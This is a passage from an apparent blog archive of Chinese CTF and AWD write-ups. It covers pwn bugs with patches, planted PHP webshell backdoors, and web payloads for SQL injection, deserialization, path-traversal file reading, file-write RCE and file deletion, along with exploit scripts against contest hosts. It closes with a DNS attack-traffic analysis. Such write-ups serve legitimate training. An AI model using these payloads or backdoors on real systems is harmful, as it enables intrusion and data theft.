unsigned int整数上溢即可达到0</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p=remote(ip,port)</span><br><span class="line">p.sendline(str(<span class="number">4294967295</span>))</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;cat flag&quot;</span>)</span><br></pre></td></tr></table></figure>
<h5 id="修复">修复</h5>
<p>改case的值或者nop掉system都可</p>
<h4 id="第二个洞-delete-order">第二个洞 delete_order</h4>
<h5 id="利用-v2">利用</h5>
<p>free后没有置NULL肯定是UAF</p>
<h5 id="修复-v2">修复</h5>
<p>简单粗暴nop掉free了<br>
当然正确做法应该是jmp出去用补上置NULL的过程</p>
<h4 id="第三个洞-comment">第三个洞 comment</h4>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">buf = <span class="built_in">malloc</span>(v1);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Your name:&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, buf, v1);</span><br><span class="line">write(<span class="number">1</span>, buf, v1);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Comments:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;format);</span><br><span class="line"><span class="built_in">printf</span>(&amp;format);</span><br></pre></td></tr></table></figure>
<h5 id="利用-v3">利用</h5>
<p>格式化字符串</p>
<h5 id="修复-v3">修复</h5>
<p>用puts替代printf避免格式化解析</p>
<h4 id="第四个洞-order">第四个洞 order</h4>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Your name:&quot;</span>);</span><br><span class="line">buf = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x10</span>uLL);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)size &lt;= <span class="number">0x50</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Baozi name:&quot;</span>);</span><br><span class="line">  v5 = <span class="built_in">malloc</span>((<span class="keyword">unsigned</span> <span class="keyword">int</span>)size);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v5)</span><br></pre></td></tr></table></figure>
<h5 id="利用-v4">利用</h5>
<p>使用scanf(&quot;%s&quot;,&amp;x)的方式读入字符串，存在溢出<br>
堆溢出</p>
<h5 id="修复-v4">修复</h5>
<p>nop！<br>
正确做法应该是jmp出去用fgets或者read替代读入有限长度的字符串</p>
<h2 id="WEB">WEB</h2>
<h3 id="web1">web1</h3>
<blockquote>
<p>链接：<a href="https://pan.baidu.com/s/1JPDSOLIH13nJfsx-8YScvA">https://pan.baidu.com/s/1JPDSOLIH13nJfsx-8YScvA</a><br>
提取码：9nln</p>
</blockquote>
<blockquote>
<p>web1留下来的版本是我修复之后，有的漏洞不太能想的起来。。</p>
</blockquote>
<h4 id="预留后门">预留后门</h4>
<p><strong>后门1</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// admin/header.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	$p=$_GET[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line">	<span class="keyword">echo</span> $p;</span><br><span class="line">	$q=exec($p);</span><br><span class="line">	var_dump($q);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>后门2</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// admin/footer.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	$shell=$_POST[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line">	system($shell);</span><br><span class="line">	<span class="keyword">if</span>($shell !=<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>后门3</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// footer.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	$shell=$_POST[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line">	system($shell);</span><br><span class="line">	<span class="keyword">if</span>($shell !=<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="SQL注入">SQL注入</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// search.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">include</span> <span class="string">&#x27;header.php&#x27;</span>;</span><br><span class="line">	<span class="keyword">include_once</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($_GET[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">	    $id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">	    $query = <span class="string">&quot;SELECT * FROM news WHERE id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line">	    $data = mysqli_query($dbc,$query);	</span><br><span class="line">	&#125;</span><br><span class="line">	$com = mysqli_fetch_array($data);</span><br><span class="line">    var_dump($com);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>修复：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$filter = <span class="string">&quot;regexp|from|count|procedure|and|ascii|substr|substring|left|right|union|if|case|pow|exp|order|sleep|benchmark|into|load|outfile|dumpfile|load_file|join|show|select|update|set|concat|delete|alter|insert|create|union|or|drop|not|for|join|is|between|group_concat|like|where|user|ascii|greatest|mid|substr|left|right|char|hex|ord|case|limit|conv|table|mysql_history|flag|count|rpad|\&amp;|\*|\.|-&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((preg_match(<span class="string">&quot;/&quot;</span>.$filter.<span class="string">&quot;/is&quot;</span>,$id)== <span class="number">1</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="反序列化">反序列化</h4>
<p>这个比赛的时候时间比较紧张，感觉反序列化的参数是不可控的，结束后复盘感觉应该可以结合上面的SQL注入漏洞一起利用，先删除news表原有的记录，然后插入反序列化后的字符串，可以造成任意文件读取。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// contact.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $f = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $g = <span class="string">&quot;fi&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $h = <span class="string">&quot;le&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $i = <span class="string">&quot;_g&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $j = <span class="string">&quot;et_c&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $k = <span class="string">&quot;ont&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $l = <span class="string">&quot;ents&quot;</span>;						</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $qw=<span class="keyword">$this</span>-&gt;g . <span class="keyword">$this</span>-&gt;h . <span class="keyword">$this</span>-&gt;i . <span class="keyword">$this</span>-&gt;j . <span class="keyword">$this</span>-&gt;k . <span class="keyword">$this</span>-&gt;l; </span><br><span class="line">        var_dump($qw(<span class="keyword">$this</span>-&gt;f));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;						</span><br><span class="line">$e = <span class="string">&quot;un&quot;</span>; </span><br><span class="line">$f = <span class="string">&quot;se&quot;</span>; </span><br><span class="line">$g = <span class="string">&quot;ri&quot;</span>; </span><br><span class="line">$h = <span class="string">&quot;al&quot;</span>; </span><br><span class="line">$i = <span class="string">&quot;ize&quot;</span>; </span><br><span class="line">$query = <span class="string">&quot;SELECT * FROM news;&quot;</span>; </span><br><span class="line">$data = mysqli_query($dbc,$query); </span><br><span class="line"><span class="keyword">while</span>($t =  mysqli_fetch_array($data)) &#123;</span><br><span class="line">    $qwe=$e.$f.$g.$h.$i; $qwe($t[<span class="number">1</span>]);</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>还有一个可疑的点：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// services.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&#x27;&#x27;</span>;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$this</span>-&gt;name&quot;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">$user = <span class="keyword">new</span> User; </span><br><span class="line">$user-&gt;name = <span class="string">&#x27;&#x27;</span>.$_POST[<span class="string">&#x27;frame&#x27;</span>]; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="web3">web3</h3>
<blockquote>
<p>链接：<a href="https://pan.baidu.com/s/1AYZftYQ8nQyMHx7-1XSn7g">https://pan.baidu.com/s/1AYZftYQ8nQyMHx7-1XSn7g</a><br>
提取码：vcr0</p>
</blockquote>
<p>web1玩的有点心态崩了。。。。</p>
<h4 id="弱口令">弱口令</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#x2F;admin</span><br></pre></td></tr></table></figure>
<h4 id="文件包含">文件包含</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;example2.php?page&#x3D;flag</span><br></pre></td></tr></table></figure>
<h4 id="预置flag">预置flag</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// core/features/userlist.php</span></span><br><span class="line">$fi = fopen(strrev(<span class="string">&quot;galf/&quot;</span>),<span class="string">&quot;r&quot;</span>);</span><br><span class="line">$sss= <span class="string">&quot;&lt;!--&quot;</span>.strrev(base64_encode(fread($fi,<span class="number">256</span>))).<span class="string">&quot;--&gt;&quot;</span>;</span><br><span class="line">fclose($fi);</span><br><span class="line">.....</span><br><span class="line"><span class="keyword">if</span> (strpos($user_flags,<span class="string">&#x27;s&#x27;</span>) !== <span class="literal">false</span>) </span><br><span class="line">    $th .= <span class="string">&#x27;&lt;td&#x27;</span>.$bg.<span class="string">&#x27;&gt;&#x27;</span>.$sss.<span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shows.php?imod&#x3D;userlist&amp;user_flags&#x3D;s</span><br></pre></td></tr></table></figure>
<h4 id="任意文件内容写入">任意文件内容写入</h4>
<p>第一处</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// inc/wizards.php</span></span><br><span class="line"><span class="keyword">foreach</span> ($_REQUEST[<span class="string">&#x27;language&#x27;</span>] <span class="keyword">as</span> $ks =&gt; $vs)&#123;</span><br><span class="line">    <span class="comment">// a=&gt;1\&quot;;phpinfo();//</span></span><br><span class="line">    <span class="comment">// $lang[&quot;a&quot;] = &quot; . str_replace(&#x27;&quot;&#x27;, &#x27;\&quot;&#x27;, &#x27;1\&quot;;phpinfo();//&#x27;);</span></span><br><span class="line">    <span class="comment">// $lang[&quot;a&quot;] = &quot;1\\&quot;;phpinfo();//</span></span><br><span class="line">    fwrite($lx, <span class="string">&#x27;$lang[&quot;&#x27;</span>.$ks.<span class="string">&#x27;&quot;] = &quot;&#x27;</span>.str_replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&quot;&#x27;</span>, $vs).<span class="string">&#x27;&quot;;&#x27;</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?mod&#x3D;wizard&amp;action&#x3D;language&amp;language[a]&#x3D;1\%22;phpinfo();&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
<p>第二处</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// inc/wizards.php</span></span><br><span class="line">$handler = fopen(SERVDIR.<span class="string">&quot;/cdata/rss_config.php&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> msg(<span class="string">&quot;error&quot;</span>,  lang(<span class="string">&#x27;Error!&#x27;</span>), <span class="string">&quot;Can not open file ./cdata/rss_config.php&quot;</span>);</span><br><span class="line">fwrite($handler, <span class="string">&quot;&lt;?PHP \n\n//RSS Configurations (Auto Generated file)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">fwrite($handler, <span class="string">&quot;\$rss_news_include_url = \&quot;&quot;</span>.htmlspecialchars($rss_news_include_url).<span class="string">&quot;\&quot;;\n\n&quot;</span>);</span><br><span class="line">fwrite($handler, <span class="string">&quot;\$rss_title = \&quot;&quot;</span>.htmlspecialchars($rss_title).<span class="string">&quot;\&quot;;\n\n&quot;</span>);</span><br><span class="line">fwrite($handler, <span class="string">&quot;\$rss_encoding = \&quot;&quot;</span>.htmlspecialchars($rss_encoding).<span class="string">&quot;\&quot;;\n\n&quot;</span>);</span><br><span class="line">fwrite($handler, <span class="string">&quot;\$rss_language = \&quot;&quot;</span>.htmlspecialchars($rss_language).<span class="string">&quot;\&quot;;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">fwrite($handler, <span class="string">&quot;?&gt;&quot;</span>);</span><br><span class="line">fclose($handler);</span><br></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?mod&#x3D;wizard&amp;action&#x3D;dosaverss&amp;rss_news_url&#x3D;http:&#x2F;&#x2F;example.com&amp;rss_title&#x3D;assert&amp;rss_encode&#x3D;$_GET[1]&amp;rss_language&#x3D;$&#123;rss_title($rss_encode)&#125;</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line">#### 任意文件删除</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;php&#x3D;</span><br><span class="line">&#x2F;&#x2F; inc&#x2F;images.php</span><br><span class="line">elseif ($action &#x3D;&#x3D; &quot;doimagedelete&quot;)</span><br><span class="line">&#123;</span><br><span class="line">    CSRFCheck();</span><br><span class="line"></span><br><span class="line">    if(!isset($images))</span><br><span class="line">        msg(&quot;info&quot;, lang(&quot;No Images selected&quot;), lang(&quot;You must select images to be deleted&quot;), &#39;#GOBACK&#39;);</span><br><span class="line"></span><br><span class="line">    foreach ($images as $image)</span><br><span class="line">        unlink(SERVDIR.&quot;&#x2F;uploads&#x2F;&quot;.$image) or print(lang(&quot;Could not delete image&quot;).&quot; &lt;b&gt;$file&lt;&#x2F;b&gt;&quot;);</span><br><span class="line"></span><br><span class="line">    msg(&quot;info&quot;, lang(&quot;Image(s) Deleted&quot;), lang(&quot;The image was successfully deleted&quot;), &#39;#GOBACK&#39;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?mod&#x3D;iamges&amp;action&#x3D;doimagedelete&amp;images[1]&#x3D;..&#x2F;index.php</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>DASCTF2020七月赛</title>
    <url>/Web_security/ctf_writeup/19.DASCTF2020%E4%B8%83%E6%9C%88%E8%B5%9B/</url>
    <content><![CDATA[<h1 id="DASCTF七月赛-Web-Writeup">DASCTF七月赛 Web Writeup</h1>
<h2 id="EzFileInclude">EzFileInclude</h2>
<h3 id="考点">考点</h3>
<ul>
<li>文件包含</li>
</ul>
<h3 id="解题">解题</h3>
<p>做的时候这道题真的是。。一言难尽</p>
<p>F12可以看到主页图片的链接http://183.129.189.60:10009/image.php?t=XXXXXX&amp;f=XXXXXXX</p>
<p>参数t是时间戳，参数f是要包含的文件名base64编码，尝试直接读<code>image.php</code>和<code>index.php</code>都没有任何回显，应该是前面拼接了路径，比如说<code>/var/www/html/img/</code>，而且过滤了<code>../</code>等路径穿越的字符，并且wrapper等手段的。</p>
<p>想了半天感觉这样应该是绝对安全的。。结果后来发现，如果f参数的开头给出一个目录再穿越就可以绕过waf了。</p>
<p>脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&#x27;http://183.129.189.60:10009/image.php&#x27;</span></span><br><span class="line">timestamp = int(time.time())</span><br><span class="line">payload = <span class="string">&#x27;gqy.jpg/../../../../../flag&#x27;</span></span><br><span class="line">params = &#123;<span class="string">&#x27;t&#x27;</span>: timestamp, <span class="string">&#x27;f&#x27;</span>: base64.b64encode(payload.encode(<span class="string">&#x27;utf-8&#x27;</span>))&#125;</span><br><span class="line"></span><br><span class="line">r = requests.get(url=URL, params=params)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
<p>顺便看一下源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;t&#x27;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you miss some parameters&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $timestamp = time();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(abs($_GET[<span class="string">&#x27;t&#x27;</span>] - $timestamp) &gt; <span class="number">10</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;what&#x27;s your time?&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $file = base64_decode($_GET[<span class="string">&#x27;f&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(substr($file, <span class="number">0</span>, strlen(<span class="string">&quot;/../&quot;</span>)) === <span class="string">&quot;/../&quot;</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">&quot;../&quot;</span>)) === <span class="string">&quot;../&quot;</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">&quot;./&quot;</span>)) === <span class="string">&quot;./&quot;</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">&quot;/.&quot;</span>)) === <span class="string">&quot;/.&quot;</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">&quot;//&quot;</span>)) === <span class="string">&quot;//&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You are not allowed to do that.&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;/var/www/html/img/&#x27;</span>.$file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="SQLi">SQLi</h2>
<h3 id="考点-v2">考点</h3>
<ul>
<li>bypass information_schema</li>
</ul>
<h3 id="解题-v2">解题</h3>
<p>太菜了。。第二题就不会了。</p>
<p>赛后看y1ng师傅的writeup：<a href="https://www.gem-love.com/ctf/2514.html">https://www.gem-love.com/ctf/2514.html</a></p>
<p>过滤了关键字</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">return preg_match(&quot;&#x2F;;|benchmark|\^|if|[\s]|in|case|when|sleep|auto|desc|stat|\||lock|or|and|&amp;|like|-|&#96;&#x2F;i&quot;, $id);</span><br></pre></td></tr></table></figure>
<p>用<code>sys.x$schema_flattened_keys</code>来绕过<code>information_schema</code></p>
<p>有回显直接联合注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">100%27&#x2F;**&#x2F;union&#x2F;**&#x2F;SELECT&#x2F;**&#x2F;group_concat(table_name),2,3&#x2F;**&#x2F;FROM&#x2F;**&#x2F;&#x2F;**&#x2F;sys.x$schema_flattened_keys&#x2F;**&#x2F;WHERE&#x2F;**&#x2F;table_schema&#x3D;&#39;sqlidb&#39;&#x2F;**&#x2F;GROUP&#x2F;**&#x2F;BY&#x2F;**&#x2F;table_name&#x2F;**&#x2F;limit&#x2F;**&#x2F;0,1%23</span><br></pre></td></tr></table></figure>
<p>另外也可以盲注，把表名给注出来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#__author__: 颖奇L&#x27;Amore www.gem-love.com</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> time <span class="keyword">as</span> t</span><br><span class="line"><span class="keyword">import</span> base64 <span class="keyword">as</span> b</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">alpa = string.ascii_letters + string.digits</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#库名 利用limit注入 sqlidb</span></span><br><span class="line"><span class="comment"># http://183.129.189.60:10004/?id=1%27limit/**/1,1/**/PROCEDURE/**/ANALYSE(1)%23</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#表名 flllaaaggg</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;SELECT group_concat(table_name) FROM  sys.x$schema_flattened_keys WHERE table_schema=&#x27;sqlidb&#x27; GROUP BY table_name limit 0,1&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">	<span class="keyword">for</span> char <span class="keyword">in</span> alpa:</span><br><span class="line">		host = <span class="string">&#x27;&#x27;&#x27;http://183.129.189.60:10004/?id=1&#x27;=(substr((&#123;payload&#125;),&#123;i&#125;,1)=&#x27;&#123;char&#125;&#x27;)%23&#x27;&#x27;&#x27;</span>.format(payload=payload.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;/**/&#x27;</span>), i=i, char=char)</span><br><span class="line"></span><br><span class="line">		r = req.get(host)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">r&#x27;admin666&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			res += char</span><br><span class="line">			print(<span class="string">&quot;found it: &quot;</span>+res)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		t.sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure>
<p>再用联合查询获得flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">100&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*,1&#x2F;**&#x2F;from&#x2F;**&#x2F;flllaaaggg%23</span><br></pre></td></tr></table></figure>
<h2 id="Homebrew-Dubbo-v2">Homebrew Dubbo v2</h2>
<p>待填坑。。。</p>
<blockquote>
<p>等一手下个星期找老板的直播讲解。</p>
</blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Datacon2019-q1-Writeup-v2</title>
    <url>/Web_security/ctf_writeup/2.Datacon2019-q1-Writeup-v2/</url>
    <content><![CDATA[<h1 id="Datacon2019-q1-Writeup-v2">Datacon2019-q1-Writeup-v2</h1>
<p>这一轮流量分析主要是<strong>分析</strong>为主，以<a href="https://github.com/shyoshyo/DataCon-9102-DNS">这篇Writeup</a>为参考，有关DNS的攻击类型、攻击手段和攻击特征，详见[DNS攻击流量分析识别-v1</p>
<h2 id="系统环境">系统环境</h2>
<ul>
<li>Windows10 64bit；</li>
<li>wireshark 3.0.3 (v3.0.3-0-g6130b92b0ec6) ；</li>
<li>TShark (Wireshark) 3.0.3 (v3.0.3-0-g6130b92b0ec6)；</li>
<li>Cmder 18026 preview；</li>
<li>python 3.7；</li>
<li>Excel 2016</li>
</ul>
<h2 id="未授权的Dynamic-Update">未授权的Dynamic Update</h2>
<p>**切入点：**粗略观察绝大部分DNS包的Opcode都是0（Standard Query），但是我们也可以分析Opcode不为零的。使用以下命令筛选：</p>
<p><code>dns and not dns.flags.opcode==0</code></p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g548iwinf2j210t0ezgnr.jpg" alt="Figure1：未授权的Dynamic Update"></p>
<p>可以看到，全部都是DNS Dynamic Update请求。接下来，使用在Cmder中使用tshark命令筛选出所有的攻击IP：</p>
<p><code>tshark.exe -r q1_final.pcap -Y &quot;dns.flags.opcode==5 &amp;&amp; dns.flags.response==0&quot; -T fields -e ip.src -e ip.dst |awk '&#123;print $1&quot;-&gt;&quot;$2&#125;' &gt; DynamicDNSip.csv</code></p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g54e5ws2vfj20bt0dddg2.jpg" alt=""></p>
<p>从图中可以看到有四个攻击来源：19.220.251.87 414，200.152.141.106 15，18.100.48.86 4091，237.205.156.233 535。<strong>由于正常的Dynamic Update 不会发送这么多且这么频繁的请求，而且涉及到二级域名com.cn以及很多其他不同域名的更新</strong>，因此我们认为这些都是攻击。再使用下面一行命令把他们选出来：</p>
<p><code>tshark.exe -r q1_final.pcap -Y &quot;dns and not dns.flags.opcode == 0 and dns.flags.response == 0&quot; -T fields -e frame.number -e ip.src | awk '&#123;print $1&quot;,5&quot;; ip[$2] += 1&#125;' &gt; DynamicDNS.csv</code></p>
<p>上述命令把这些攻击包的标号和类型(5) 输出到了DynamicDNS.csv</p>
<h2 id="反射放大攻击">反射放大攻击</h2>
<p>**切入点：**我们接下来再看看除了A(1) 和AAAA(28) 这两个常见类型以外的DNS 请求。使用如下命令启动<br>
wireshark：</p>
<p><code>wireshark -r q1_final.pcap -R &quot;dns and not dns.query.type in &#123;1, 28&#125; and dns.flags.opcode == 0&quot;</code></p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g55hio4fw8j210p0ghq5h.jpg" alt="除了A(1) 和AAAA(28) 类型以外的DNS 请求"></p>
<p>如图所示，可以看到有很多杂七杂八的DNS 请求。为便于观察，我们按照请求类型排序。简单浏览一下，我们就能够发现一些攻击。例如，我们可以看到反射放大攻击：</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g55itxa9hqj210r0h1whb.jpg" alt="反射放大攻击"></p>
<p>使用以下命令统计各IP的进/出流量：</p>
<p><code>tshark -r q1_final.pcap -T fields -e ip.src -e ip.dst -e frame.len | awk '&#123;send[$1] += $3; rece[$1] += 0; rece[$2] += $3; send[$2] += 0;&#125; END &#123;for(ip in send) if(rece[ip] == 0) tmp = 1e60; else tmp = send[ip]/rece[ip]; for(ip in send) print ip, send[ip], rece[ip], tmp; &#125;' &gt; send_rece.csv</code></p>
<p>为了更容易观察这些IP的流量特征，可以使用Python的matplotlib模块作图：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line">send = []</span><br><span class="line">rece = []</span><br><span class="line">ip = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;send_rece.csv&#x27;</span> ,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> csvfile:</span><br><span class="line">	plots = csv.reader(csvfile, delimiter=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">	<span class="keyword">for</span> row <span class="keyword">in</span> plots:</span><br><span class="line">		<span class="keyword">if</span> row[<span class="number">0</span>] == <span class="string">&#x27;45.80.170.1&#x27;</span>: <span class="keyword">continue</span></span><br><span class="line">		send.append(int(row[<span class="number">1</span>]))</span><br><span class="line">		rece.append(int(row[<span class="number">2</span>]))</span><br><span class="line">		ip.append(row[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">fig, ax = plt.subplots()</span><br><span class="line">ax.scatter(send, rece, label=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i, txt <span class="keyword">in</span> 